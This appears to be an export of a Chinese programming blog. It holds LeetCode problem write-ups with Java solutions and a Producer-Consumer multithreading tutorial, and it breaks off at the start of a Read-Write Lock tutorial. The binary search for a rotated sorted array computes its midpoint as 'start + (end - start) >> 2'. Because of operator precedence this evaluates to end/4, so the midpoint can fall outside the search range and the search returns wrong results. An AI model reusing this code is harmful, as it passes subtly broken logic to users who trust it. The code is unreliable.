    <url>/2018/09/10/LeetCode/leetcode-000030.%20%E4%B8%8E%E6%89%80%E6%9C%89%E5%8D%95%E8%AF%8D%E7%9B%B8%E5%85%B3%E8%81%94%E7%9A%84%E5%AD%97%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串 s 和一些长度相同的单词 words。找出 s 中恰好可以由 words 中所有单词串联形成的子串的起始位置。</p>
<p>注意子串要与 words 中的单词完全匹配，中间不能有其他字符，但不需要考虑 words 中单词串联的顺序。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">  s = <span class="string">"barfoothefoobarman"</span>,</span><br><span class="line">  words = [<span class="string">"foo"</span>,<span class="string">"bar"</span>]</span><br><span class="line">输出：[<span class="number">0</span>,<span class="number">9</span>]</span><br><span class="line">解释：</span><br><span class="line">从索引 <span class="number">0</span> 和 <span class="number">9</span> 开始的子串分别是 <span class="string">"barfoo"</span> 和 <span class="string">"foobar"</span> 。</span><br><span class="line">输出的顺序不重要, [<span class="number">9</span>,<span class="number">0</span>] 也是有效答案。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">  s &#x3D; &quot;wordgoodgoodgoodbestword&quot;,</span><br><span class="line">  words &#x3D; [&quot;word&quot;,&quot;good&quot;,&quot;best&quot;,&quot;word&quot;]</span><br><span class="line">输出：[]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>35. 搜索插入位置</title>
    <url>/2018/09/10/LeetCode/leetcode-000035.%20%E6%90%9C%E7%B4%A2%E6%8F%92%E5%85%A5%E4%BD%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p>
<p>你可以假设数组中无重复元素。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,3,5,6], 5</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,3,5,6], 2</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,3,5,6], 7</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,3,5,6], 0</span><br><span class="line">输出: 0</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>27. 移除元素</title>
    <url>/2018/09/10/LeetCode/leetcode-000027.%20%E7%A7%BB%E9%99%A4%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个数组 nums 和一个值 val，你需要 原地 移除所有数值等于 val 的元素，并返回移除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须仅使用 O(1) 额外空间并 原地 修改输入数组。</p>
<p>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素.</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定 nums = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>], val = <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 <span class="number">2</span>, 并且 nums 中的前两个元素均为 <span class="number">2</span>。</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定 nums = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">2</span>], val = <span class="number">2</span>,</span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 <span class="number">5</span>, 并且 nums 中的前五个元素为 <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>。</span><br><span class="line"></span><br><span class="line">注意这五个元素可为任意顺序。</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>为什么返回数值是整数，但输出的答案是数组呢?</p>
<p>请注意，输入数组是以「引用」方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。</p>
<p>你可以想象内部操作如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// nums 是以“引用”方式传递的。也就是说，不对实参作任何拷贝</span></span><br><span class="line"><span class="keyword">int</span> len = removeElement(nums, val);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在函数里修改输入数组对于调用者是可见的。</span></span><br><span class="line"><span class="comment">// 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：双指针"><a href="#解法一：双指针" class="headerlink" title="解法一：双指针"></a>解法一：双指针</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> n = nums.length;</span><br><span class="line">		<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[i] != val) &#123;</span><br><span class="line">				nums[j++] = nums[i];</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				n --;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>33. 搜索旋转排序数组</title>
    <url>/2018/09/10/LeetCode/leetcode-000033.%20%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设按照升序排序的数组在预先未知的某个点上进行了旋转。</p>
<p>( 例如，数组 [0,1,2,4,5,6,7] 可能变为 [4,5,6,7,0,1,2] )。</p>
<p>搜索一个给定的目标值，如果数组中存在这个目标值，则返回它的索引，否则返回 -1 。</p>
<p>你可以假设数组中不存在重复的元素。</p>
<p>你的算法时间复杂度必须是 O(log n) 级别。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [4,5,6,7,0,1,2], target &#x3D; 0</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [4,5,6,7,0,1,2], target &#x3D; 3</span><br><span class="line">输出: -1</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>二分查找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> end = nums.length - <span class="number">1</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">while</span> (start &lt;= end) &#123;</span><br><span class="line">			<span class="keyword">int</span> mid = start + (end - start) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">				<span class="keyword">return</span> mid;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 前半部分有序,注意此处用小于等于</span></span><br><span class="line">			<span class="keyword">if</span> (nums[start] &lt;= nums[mid]) &#123;</span><br><span class="line">				<span class="comment">// target在前半部分</span></span><br><span class="line">				<span class="keyword">if</span> (target &gt;= nums[start] &amp;&amp; target &lt; nums[mid]) &#123;</span><br><span class="line">					end = mid - <span class="number">1</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					start = mid + <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (target &lt;= nums[end] &amp;&amp; target &gt; nums[mid]) &#123;</span><br><span class="line">					start = mid + <span class="number">1</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					end = mid - <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>21. 合并两个有序链表</title>
    <url>/2018/09/10/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-25-%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>将两个升序链表合并为一个新的升序链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">4</span>, <span class="number">1</span>-&gt;<span class="number">3</span>-&gt;<span class="number">4</span></span><br><span class="line">输出：<span class="number">1</span>-&gt;<span class="number">1</span>-&gt;<span class="number">2</span>-&gt;<span class="number">3</span>-&gt;<span class="number">4</span>-&gt;<span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：遍历合并"><a href="#解法一：遍历合并" class="headerlink" title="解法一：遍历合并"></a>解法一：遍历合并</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;	</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == l1) &#123;</span><br><span class="line">			<span class="keyword">return</span> l2;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == l2) &#123;</span><br><span class="line">			<span class="keyword">return</span> l1;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		ListNode dummyNode = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">		ListNode dummy = dummyNode;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != l1 &amp;&amp; <span class="keyword">null</span> != l2) &#123;</span><br><span class="line">			<span class="keyword">if</span> (l1.val &lt;= l2.val) &#123;</span><br><span class="line">				dummy.next = l1;</span><br><span class="line">				l1 = l1.next;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				dummy.next = l2;</span><br><span class="line">				l2 = l2.next;</span><br><span class="line">			&#125;</span><br><span class="line">			dummy = dummy.next;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		dummy.next = l1 == <span class="keyword">null</span> ? l2 : l1;</span><br><span class="line">		<span class="keyword">return</span> dummyNode.next;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：递归"><a href="#解法二：递归" class="headerlink" title="解法二：递归"></a>解法二：递归</h3><h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (null == l1) &#123;</span><br><span class="line">			<span class="keyword">return</span> l2;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (null == l2) &#123;</span><br><span class="line">			<span class="keyword">return</span> l1;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (l1.val &lt; l2.val) &#123;</span><br><span class="line">			l1.next = mergeTwoLists(l1.next, l2);</span><br><span class="line">			<span class="keyword">return</span> l1;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			l2.next = mergeTwoLists(l1, l2.next);</span><br><span class="line">			<span class="keyword">return</span> l2;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/solution/he-bing-liang-ge-you-xu-lian-biao-by-leetcode/" target="_blank" rel="noopener">LeetCode-合并两个有序链表-题解</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>Producer-Consumer 模式</title>
    <url>/2018/09/06/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/5.Producer-Consumer%20%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Producer-Consumer-模式"><a href="#Producer-Consumer-模式" class="headerlink" title="Producer-Consumer 模式"></a>Producer-Consumer 模式</h2><p>Producer是“生产者”的意思，指的是生成数据的线程。Consumer则是“消费者”的意思，指的是使用数据的线程。</p>
<p><strong>生产者安全地将数据交给消费者</strong>。虽然仅是这样看似简单的操作，但当生产者和消费者以不同的线程运行时，两者之间的处理速度差异便会引起问题。例如，消费者想要获取数据，可数据还没有生成，或者生产者想要交付数据，而消费者的状态还无法接受数据等。</p>
<p>Producer-Consumer模式在生产者和消费者之间加入了一个“桥梁”角色。该桥梁角色用于消除线程间处理速度的差异。</p>
<p>一般来说，在该模式中，生产者和消费者都有多个，当然，生产者和消费者有时也会只有一个。当两者都只有一个时，称之为PIPE模式。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>在这个示例程序中，有3位糕点师制作蛋糕并将其放到桌子上，然后有三位客人来吃这些蛋糕。程序运行如下所示：</p>
<ul>
<li>糕点师（MakerThread）制作蛋糕（String）。并将其放置到桌子上（Table）上。</li>
<li>桌上最多可以防止3个蛋糕</li>
<li>如果桌子上已经放满3个蛋糕时糕点师还要再放置蛋糕，必须等到桌子上空出位置。</li>
<li>客人（EaterThread）取桌子上的蛋糕吃</li>
<li>客人按蛋糕被放置到桌子上的顺序来取蛋糕</li>
<li>当桌子上1个蛋糕都没有时，客人若要取蛋糕，必须等到桌子上新放置了蛋糕。</li>
</ul>
<h3 id="类的一览图"><a href="#类的一览图" class="headerlink" title="类的一览图"></a>类的一览图</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>MakerThread</td>
<td>表示糕点师的类</td>
</tr>
<tr>
<td>EaterThread</td>
<td>表示客人的类</td>
</tr>
<tr>
<td>Table</td>
<td>表示桌子的类</td>
</tr>
<tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
</tbody></table>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><p>Main类会创建一个桌子的实例，并启动表示糕点师和客人的线程。MakerThread和EaterThread的构造函数中传入的数字只是用来作为随机数的种子，数值本身并没有什么特别的意义。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Table table = <span class="keyword">new</span> Table(<span class="number">3</span>);</span><br><span class="line">		<span class="keyword">new</span> MakerThread(<span class="string">"M1"</span>, table, <span class="number">78548</span>).start();</span><br><span class="line">		<span class="keyword">new</span> MakerThread(<span class="string">"M2"</span>, table, <span class="number">31415</span>).start();</span><br><span class="line">		<span class="keyword">new</span> MakerThread(<span class="string">"M3"</span>, table, <span class="number">48521</span>).start();</span><br><span class="line">		<span class="keyword">new</span> EaterThread(<span class="string">"E1"</span>, table, <span class="number">78541</span>).start();</span><br><span class="line">		<span class="keyword">new</span> EaterThread(<span class="string">"E2"</span>, table, <span class="number">78214</span>).start();</span><br><span class="line">		<span class="keyword">new</span> EaterThread(<span class="string">"E3"</span>, table, <span class="number">12532</span>).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="MakerThread类"><a href="#MakerThread类" class="headerlink" title="MakerThread类"></a>MakerThread类</h3><p>MakerThread类用于制作蛋糕，并将其放置在桌子上，也就是糕点师。为了简单期起见，我们像下面这样以“流水号”和制作该蛋糕的“线程名称”来表示蛋糕。<br>{ Cake No.123 by MakerThread-1 }<br>       流水号     线程名称</p>
<p>为了使程序的运行结果方便查看，蛋糕的流水号在所有的糕点师质检室公用的。为此，这里将流水号（id）声明了静态字段。</p>
<p>MakeThread会先暂停一段随机长（0-1000毫秒之间）的时间，然后再调用Table类的put方法将制作好的蛋糕放置到桌子上。暂停的这段时间模拟的是“制作蛋糕所花费的时间”。</p>
<p>MakeThread无限循环执行“制作蛋糕-&gt;放置到桌子上”，是蛋糕的生产者。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MakerThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Random random;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Table table;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MakerThread</span><span class="params">(String name, Table table, <span class="keyword">long</span> seed)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.table = table;</span><br><span class="line">		<span class="keyword">this</span>.random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">				String cake = <span class="string">"[ Cake No."</span> + nextId() + <span class="string">"by "</span> + getName() + <span class="string">" ]"</span>;</span><br><span class="line">				table.put(cake);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">nextId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> id++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="EaterThread类"><a href="#EaterThread类" class="headerlink" title="EaterThread类"></a>EaterThread类</h3><p>EaterThread类用于表示从桌子上取蛋糕吃的人。</p>
<p>客人通过Table类的Take方法取桌子上的蛋糕。然后，与MakerThread类一样，EaterThread也会暂停一段随机长的时间。</p>
<p>EaterThread无限循环执行“从桌子上取蛋糕-&gt;吃蛋糕”，是蛋糕的消费者。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EaterThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Random random;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Table table;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">EaterThread</span><span class="params">(String name, Table table, <span class="keyword">long</span> seed)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.table = table;</span><br><span class="line">		<span class="keyword">this</span>.random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				String cake = table.take();</span><br><span class="line">				Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Table-类"><a href="#Table-类" class="headerlink" title="Table 类"></a>Table 类</h2><p>Table类用于表示放置蛋糕的桌子。</p>
<p>可放置的蛋糕个数通过构造函数来制定。</p>
<p>在示例程序中，蛋糕以String实例来表示。Table类声明了一个String数组类型的buffer字段，用于作为蛋糕的实际放置位置。</p>
<p>为了正确放置（put）和取（take）蛋糕，table类还声明了int类型的字段tail、head和count。各字段的含义分别如下所示。</p>
<ul>
<li>tail字段：表示下一次放置（put）蛋糕的位置</li>
<li>head字段：表示下一次取（take）蛋糕的位置</li>
<li>count字段：表示当前桌子上放置的蛋糕的个数。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Table</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String[] buffer;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> tail;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> head;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Table</span><span class="params">(<span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.buffer = <span class="keyword">new</span> String[count];</span><br><span class="line">		<span class="keyword">this</span>.head = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">this</span>.tail = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(String cake)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		System.out.println(Thread.currentThread().getName() + <span class="string">" puts "</span> + cake);</span><br><span class="line">		<span class="keyword">while</span> (count &gt;= buffer.length) &#123;</span><br><span class="line">			wait();</span><br><span class="line">		&#125;</span><br><span class="line">		buffer[tail] = cake;</span><br><span class="line">		tail = (tail + <span class="number">1</span>) % buffer.length;</span><br><span class="line">		count++;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">			wait();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		String cake = buffer[head];</span><br><span class="line">		head = (head + <span class="number">1</span>) % buffer.length;</span><br><span class="line">		count--;</span><br><span class="line">		notifyAll();</span><br><span class="line">		System.out.println(Thread.currentThread().getName() + <span class="string">" takes "</span> + cake);</span><br><span class="line">		<span class="keyword">return</span> cake;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="运行结果示例"><a href="#运行结果示例" class="headerlink" title="运行结果示例"></a>运行结果示例</h3><p><img src="https://huhansi.github.io/images/result.PNG" alt="运行结果示例"></p>
]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>java</tag>
        <tag>设计模式</tag>
        <tag>Producer-Consumer 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Read-Write Lock 模式</title>
    <url>/2018/09/06/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/6.Read-Write%20Lock%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Read-Write-Lock-模式"><a href="#Read-Write-Lock-模式" class="headerlink" title="Read-Write Lock 模式"></a>Read-Write Lock 模式</h2><p>当线程“读取”实例的状态时，示例的状态不会发生变化。示例的状态尽在线程执行“写入”操作时才会发生变化。从实例的状态变化这个观点来看，“读取”和“写入”有着本质的区别。</p>
<p>在Read-Write Lock模式中，读取操作和写入操作是分开考虑的，在执行读取操作之前，线程必须获取用于读取的锁。而在执行写入操作之前，线程必须获取用于写入的锁。</p>
<p>由于当线程执行读取操作时，示例的状态不会发生变化，所以多个线程可以同时读取。但在读取时，不可写入。</p>
<p>当线程执行写入操作时，示例的状态就会发生变化。因此，当有一个线程正在写入时，其他线程不可读取或写入。</p>
<p>一般来说，执行互斥处理会降低程序性能。但如果把针对写入的互斥处理和针对读取的互斥处理分开来考虑，则可以提高程序性能。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>WriterThread</td>
<td>表示写入线程的类</td>
</tr>
<tr>
<td>ReadThread</td>
